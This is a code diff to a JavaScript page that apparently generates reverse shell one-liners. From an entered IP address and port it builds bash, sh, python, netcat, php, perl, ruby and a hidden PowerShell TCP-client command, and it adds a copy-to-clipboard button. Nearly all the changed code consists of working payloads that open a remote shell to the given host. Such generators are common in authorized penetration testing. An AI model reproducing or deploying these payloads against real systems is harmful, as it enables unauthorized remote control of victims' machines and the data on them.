@@ -38,23 +38,38 @@ document.getElementById("createShell").onclick = () => {
 
   let cmd = "";
 
-  if (script === "bash") {
+  if (script === "bash")
     cmd = `bash -i >& /dev/tcp/${ip}/${port} 0>&1`;
-  }
 
-  if (script === "sh") {
+  if (script === "sh")
     cmd = `sh -i >& /dev/tcp/${ip}/${port} 0>&1`;
-  }
 
-  if (script === "python") {
-    cmd = `python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("${ip}",${port}));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/sh")'`;
-  }
+  if (script === "python")
+    cmd = `python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("${ip}",${port}));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'`;
 
-  if (script === "nc") {
-    cmd = `nc ${ip} ${port} -e /bin/sh`;
-  }
+  if (script === "nc")
+    cmd = `nc ${ip} ${port} -e /bin/bash`;
+
+  if (script === "php")
+    cmd = `php -r '$sock=fsockopen("${ip}",${port});exec("/bin/bash -i <&3 >&3 2>&3");'`;
+
+  if (script === "perl")
+    cmd = `perl -e 'use Socket;$i="${ip}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'`;
+
+  if (script === "ruby")
+    cmd = `ruby -rsocket -e 'f=TCPSocket.open("${ip}",${port}).to_i;exec sprintf("/bin/bash -i <&%d >&%d 2>&%d",f,f,f)'`;
+
+  if (script === "powershell")
+    cmd = `powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$client = New-Object System.Net.Sockets.TCPClient('${ip}',${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1 | Out-String );$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}"`;
 
   document.getElementById("shellOutput").textContent = cmd;
+};
+
+document.getElementById("copyShell").onclick = () => {
+
+  const text = document.getElementById("shellOutput").textContent;
+
+  navigator.clipboard.writeText(text);
 };
 
 /* ------------------------------
